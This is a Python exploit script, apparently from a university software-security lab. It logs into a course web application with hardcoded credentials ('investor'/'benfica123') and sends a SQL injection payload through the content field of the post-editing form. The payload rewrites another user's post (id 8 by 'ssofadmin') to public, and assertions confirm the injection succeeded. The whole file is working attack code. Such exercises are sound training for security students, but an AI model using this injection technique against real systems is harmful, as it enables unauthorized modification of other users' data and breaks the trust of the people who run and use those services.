import requests, random 

Server = 'http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt'
session = requests.session()

#Login into the account (must have a post, defaul:investor) 
user = "investor"
password = "benfica123"

params = {'username' : user, 'password' : password }
r = session.post(Server + '/login', data=params)

#Default: post id=2, author=ssofadmin and altered post id=8
post_id = "2"
salt = str(random.randint(2 ** 27, 2 ** 28)) 

assert "vuln3"+salt not in r.text

headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
params = {}
r = requests.get(Server + '/edit_post?id='+post_id, params=params, headers=headers, cookies = session.cookies)

params = {'id' : post_id, 'content' : "vuln3"+salt+"', type = 'public' where author = 'ssofadmin' and id = 8 -- ", 'type' : 'Public' }
r = session.post(Server + '/edit_post', data=params, cookies = session.cookies)

assert "vuln3"+salt in r.text
print('Post altered')